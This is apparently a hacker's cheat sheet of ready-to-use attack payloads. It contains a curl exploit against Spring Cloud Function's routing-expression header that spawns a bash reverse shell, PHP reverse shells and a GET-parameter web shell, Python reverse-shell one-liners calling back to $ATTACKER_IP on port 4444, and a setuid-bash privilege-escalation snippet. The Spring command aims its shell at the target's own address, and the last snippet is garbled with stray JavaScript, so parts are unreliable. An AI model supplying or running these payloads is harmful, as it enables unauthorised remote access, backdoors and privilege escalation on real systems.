JAVA Spring Boot cloud exploit and rev-shell:
---
```shell
curl -X POST [http://$TARGET_IP:8080/functionRouter](http://$TARGET_IP:8080/functionRouter) -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/$TARGET_IP/4444 0>&1")' --data-raw 'data' -v
```

Windows PHP rev shell
---
[https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)

PHP Reverse shell LFI:
---
#php #rev-shell #reverse #rev 

or use system() exec() passthru() **shell_exec**()

```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/$ATTACKER_IP/4444 0>&1'");?>
```


```php
<?php $sock=fsockopen("$ATTACKER_IP",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>
```

```php
<?php exec($_GET['cmd']);?>
```

Python Rev shell
---
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
```

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Python Priv Esc
---
```python
pyimport os;os.system("chmod +s /bin/bash");f=function f2(){};
```
